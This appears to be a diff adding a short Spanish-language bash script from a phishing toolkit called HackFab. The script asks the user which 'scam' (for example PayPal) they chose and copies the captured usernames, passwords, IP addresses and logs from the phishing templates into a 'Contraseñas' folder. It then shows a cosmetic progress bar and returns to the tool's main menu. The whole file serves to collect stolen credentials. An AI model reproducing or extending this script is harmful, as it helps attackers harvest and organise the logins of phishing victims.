@@ -1,0 +1,23 @@
+bash .banner
+echo "Que scam escogiste:"
+echo ""
+ls -d .st/*/
+echo ""
+read input
+mkdir Contraseñas
+mkdir Contraseñas/$input
+mv .st/rezult.txt .st/paypal/saved.usernames.txt
+cp .st/$input/saved.usernames.txt -r Contraseñas/$input/Login.txt
+cp .st/$input/saved.ip.txt -r Contraseñas/$input/Login-ip.txt
+cp .st/$input/usernames.txt -r Contraseñas/$input/Login.txt
+cp .st/$input/ip.txt -r Contraseñas/$input/Login-ip-info.txt
+cp .st/$input/logs.txt -r Contraseñas/$input/Login.txt
+bash .banner
+echo "Recuperando contraseñas..."
+echo ""
+echo "100% |████████████████████████████████|Analizis completo"
+echo "Contraseñas guardadas en: Contraseñas/$input/Login.txt"
+echo ""
+echo "Precione una tecla para continuar..."
+read input1
+bash HackFab.sh
